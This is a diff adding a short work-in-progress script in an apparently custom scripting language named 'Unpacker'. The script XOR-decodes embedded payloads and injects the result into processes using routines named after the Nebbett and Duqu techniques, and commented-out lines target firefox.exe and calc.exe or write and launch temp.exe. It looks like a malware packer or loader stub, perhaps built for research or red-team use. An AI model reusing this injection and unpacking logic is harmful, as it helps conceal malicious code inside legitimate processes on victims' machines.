@@ -1,0 +1,24 @@
+#SAMPLE
+
+name[Unpacker]
+version[wip]
+
+#PIECES
+
+datamanip.xORarray[PACK1,42][unxored, unxorsize]
+
+##file.writeptr["temp.exe",unxored,unxorsize][]
+##process.create["temp.exe",NULL,CREATE_NEW_CONSOLE][phandle]
+
+##process.create["C:\\Windows\\SysWOW64\\calc.exe",NULL,CREATE_NEW_CONSOLE][phandle]
+
+##process.nebbettshuttle[unxored,"C:\\Program Files\\Mozilla Firefox\\firefox.exe"][]
+##process.nebbettshuttle[unxored,"C:\\Windows\\SysWOW64\\calc.exe"][]
+
+##process.duqushuttle[unxored,"C:\\hello.exe"][]
+
+process.nebbettshuttle[unxored,"C:\\hello.exe"][]
+
+datamanip.xORarray[PACK2,42][unxored,unxorsize]
+
+cli.print[unxored][]
